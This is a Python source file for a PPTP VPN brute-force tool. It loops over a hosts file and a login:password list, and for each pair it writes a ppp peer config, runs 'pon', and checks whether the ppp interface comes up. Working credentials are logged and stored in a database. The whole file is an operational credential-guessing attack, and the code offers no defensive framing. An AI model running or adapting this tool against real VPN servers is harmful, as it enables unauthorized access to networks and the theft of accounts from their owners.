import logging
import subprocess
import time
from pathlib import Path

import psutil

from database import base_session, HostsDataTable
from consts import VPNBruteTypes
import os

logging.basicConfig(level=logging.INFO)


def attempt_decorator(fn):
    def inner(*args, **kwargs):
        try:
            return fn(*args, **kwargs)
        except KeyboardInterrupt:
            PPTPBrute.poff()
        exit()
    return inner


class PPTPBrute:
    file_sample = open('config_example').read()
    config_path = Path('/etc/ppp/peers/vpn_brute')
    pptp_logger = logging.getLogger('PPTP')
    interface = 'ppp0'
    timeout = 10

    @classmethod
    def poff(cls):
        subprocess.run(['poff', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # works only with this
        time.sleep(1)

    @classmethod
    @attempt_decorator
    def connect_attempt(cls, host: str, login: str, password: str):
        content = cls.file_sample.format(host=host, login=login, password=password)
        # TODO add check port availability
        with open(cls.config_path, 'w') as file:
            file.write(content + '\n')
        subprocess.run(['pon', 'vpn_brute'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cls.pptp_logger.info(
            f'PPTP configuration for {host} has created. Running pon command and waiting for connection {cls.timeout} seconds.'
        )
        for i in range(cls.timeout):
            if psutil.net_if_addrs().get(cls.interface):
                cls.poff()
                cls.pptp_logger.info(f'Success! Host: {host} username: {login} password: {password}')
                host_orm = HostsDataTable(host=host, username=login, password=password, port=1723)
                host_orm.add_or_edit_data_to_base()
                base_session.commit()
                return host_orm
            time.sleep(1)
        cls.pptp_logger.info('Connection failed!')
        # need to shut down worker
        cls.poff()


def cli():
    list_dir = os.listdir()
    if os.getuid() != 0:
        raise SystemExit(VPNBruteTypes.no_root_error)
    if VPNBruteTypes.hosts_file not in list_dir:
        print(f'Example of hosts file content:\n{VPNBruteTypes.hosts_file_example}')
        raise SystemExit(VPNBruteTypes.hosts_file_error)
    if VPNBruteTypes.credentials_file not in list_dir:
        print(f'Example of credentials file content:\n{VPNBruteTypes.credential_file_example}')
        raise SystemExit(VPNBruteTypes.credential_file_error)
    hosts = open(VPNBruteTypes.hosts_file).read().split('\n')
    credentials = open(VPNBruteTypes.credentials_file).read().split('\n')
    # if we are using vpn, we need to replace original interface name:
    if psutil.net_if_addrs().get(PPTPBrute.interface):
        PPTPBrute.interface = 'ppp1'
    for num, host in enumerate(hosts, start=1):
        print(num, "/", len(hosts))
        for line in credentials:
            login, password = line.split(':')
            PPTPBrute.connect_attempt(host=host, login=login, password=password)


if __name__ == '__main__':
    cli()
